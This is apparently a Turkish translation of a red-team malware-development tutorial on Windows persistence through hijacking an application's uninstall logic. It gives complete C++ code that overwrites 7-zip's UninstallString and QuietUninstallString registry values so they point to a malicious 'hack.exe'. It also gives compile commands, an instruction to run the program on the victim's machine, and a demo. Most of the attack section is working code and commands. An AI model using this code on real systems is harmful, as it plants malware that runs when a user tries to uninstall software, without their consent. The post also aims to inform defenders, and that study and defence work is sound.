\newpage
\subsection{79. kötü amaçlı yazılım geliştirme: kalıcılık - bölüm 13. Bir uygulamanın kaldırma mantığını ele geçirme. Basit C++ örneği.}

﷽

![pers](./images/73/2022-10-04_21-03_1.png){width="80%"}    

Bu gönderi, hedef uygulamanın kaldırma dosyasını ele geçirerek kötü amaçlı yazılım kalıcılığı sağlama konusunda kendi araştırmalarımın bir sonucudur.     

### kaldırma süreci (uninstallation)

Windows sistemine bir program yüklediğinizde, genellikle kendi kaldırıcılarına yönlendirilirler. Bunlar şu kayıt defteri anahtarlarında bulunur:    

`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\<application name>`    

ve   

`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\QuietUninstallString\<application name>`     

Peki, numara nedir? Bunları, başka herhangi bir programı çalıştırabilecek komutlarla değiştirmekte bir sakınca yoktur. Bir kullanıcı kaldırıcıyı çalıştırdığında, saldırganın seçtiği komut çalıştırılır. Yine de iyi haber şu ki, bu öğeleri değiştirmek için ayrıcalıklar gereklidir, çünkü `HKLM` anahtarı altında yer alırlar.     

### pratik örnek

Hadi pratik bir örneğe bakalım. Öncelikle, bir hedef uygulama seçelim. Ben `7-zip x64`'ü seçtim:    

![pers](./images/73/2022-10-04_20-13_1.png){width="80%"}    

![pers](./images/73/2022-10-04_20-15.png){width="80%"}    

![pers](./images/73/2022-10-04_20-15_1.png){width="80%"}    

Ardından, doğruluk açısından kayıt defteri anahtar değerlerini kontrol edin:    

```powershell
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\7-zip" /s
```

![pers](./images/73/2022-10-04_20-08.png){width="80%"}    

Ayrıca, kötü amaçlı uygulamamı hazırladım. Her zamanki gibi, `meow-meow` kötü amaçlı yazılımı :)      

![pers](./images/73/2022-10-04_20-10.png){width="80%"}    

Daha sonra, kalıcılık için mantığımı gerçekleştiren bir program oluşturdum (`pers.cpp`):    

```cpp
/*
pers.cpp
windows persistence via
hijacking uninstall app
author: @cocomelonc
https://cocomelonc.github.io/malware/2022/10/04/malware-pers-13.html
*/
#include <windows.h>
#include <string.h>

int main(int argc, char* argv[]) {
  HKEY hkey = NULL;

  // target app
  const char* app = 
  "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\7-zip";

  // evil app
  const char* exe = 
  "C:\\Users\\User\\Documents\\malware\\2022-10-04-malware-pers-13\\hack.exe";

  // app
  LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)app, 0 , KEY_WRITE, &hkey);
  if (res == ERROR_SUCCESS) {
    // update registry key value
    // reg add 
    //"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Uninstall\
    // 7-zip" /v "UninstallString" /t REG_SZ /d "...\hack.exe" /f
    RegSetValueEx(hkey, (LPCSTR)"UninstallString", 0, REG_SZ, (unsigned char*)
    exe, strlen(exe));
    RegSetValueEx(hkey, (LPCSTR)"QuietUninstallString", 0, REG_SZ, 
    (unsigned char*)exe, strlen(exe));
    RegCloseKey(hkey);
  }

  return 0;
}
```

Gördüğünüz gibi mantık basit, sadece kayıt defterindeki hedef anahtar değerlerini güncelliyoruz.    

### demo

Hadi her şeyi aksiyonda görelim. Kötü amaçlı yazılımı ve kalıcılık betiğini derleyin:    

```bash
x86_64-w64-mingw32-g++ -O2 pers.cpp -o pers.exe \
-I/usr/share/mingw-w64/include/ -s -ffunction-sections \
-fdata-sections -Wno-write-strings -fno-exceptions \
-fmerge-all-constants -static-libstdc++ \
-static-libgcc -fpermissive
```

![pers](./images/73/2022-10-04_20-09.png){width="80%"}    

Ve bunu kurbanın makinesinde çalıştırın - benim durumumda `Windows 10 x64`:    

```powershell
.\pers.exe
```

![pers](./images/73/2022-10-04_20-59.png){width="80%"}    

Son olarak, sistemimi yeniden başlattıktan sonra `7-zip`'i kaldırmayı denedim:    

![pers](./images/73/2022-10-04_20-13_1.png){width="80%"}    

![pers](./images/73/2022-10-04_20-15.png){width="80%"}    

![pers](./images/73/2022-10-04_21-01.png){width="80%"}    

![pers](./images/73/2022-10-04_21-03.png){width="80%"}    

Ardından Process Hacker 2'de `hack.exe`'nin özelliklerine baktım:    

![pers](./images/73/2022-10-04_21-05.png){width="80%"}    

Gördüğünüz gibi üst işlem `SystemSettings.exe` - Windows ayarlarını açtığınızda gördüğünüz şeydir. Bizim durumumuzda, bu `program ekle/kaldır` kısmıdır. Mükemmel! =^..^=    

Küçük bir sorun var. Anahtarı `Z:\2022-10-04-malware-pers-13\hack.exe` yoluyla güncellemeye çalıştığımda şu hatayı alıyorum:    

![pers](./images/73/2022-10-05_17-37.png){width="80%"}    

Belki de yalnızca `C:\` diski içindeki yolları kullanabilirsiniz.    

Deneylerin sonunda temizleme işlemi yapın:    

```powershell
reg add 
"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Uninstall\7-zip" 
/v "UninstallString" /t REG_SZ /d "C:\Program Files\7-zip\Uninstall.exe" /f
```

![pers](./images/73/2022-10-05_17-50.png){width="80%"}    

### sonuç

Elbette, belki de bu numara kalıcılık için o kadar da harika değildir, çünkü kullanıcının izinleri ve katılımı gereklidir. Ama neden olmasın?    

Kalıcılık için programları yükleyip kaldırmayı kullanarak bir numara daha var, bunun hakkında gelecekteki gönderilerimden birinde yazacağım. Bu olasılığı kırmızı takım için araştırmaya devam ediyorum.   

Umarım bu gönderi, mavi takım üyelerinin bu ilginç teknik hakkında farkındalığını artırır ve kırmızı takım üyeleri için bir silah ekler.    

[RegOpenKeyEx](https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regopenkeyexa)    
[RegSetValueEx](https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regsetvalueexa)    
[RegCloseKey](https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regclosekey)    
[reg query](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/reg-query)      
[github'taki kaynak kod](https://github.com/cocomelonc/meow/tree/master/2022-10-04-malware-pers-13)     
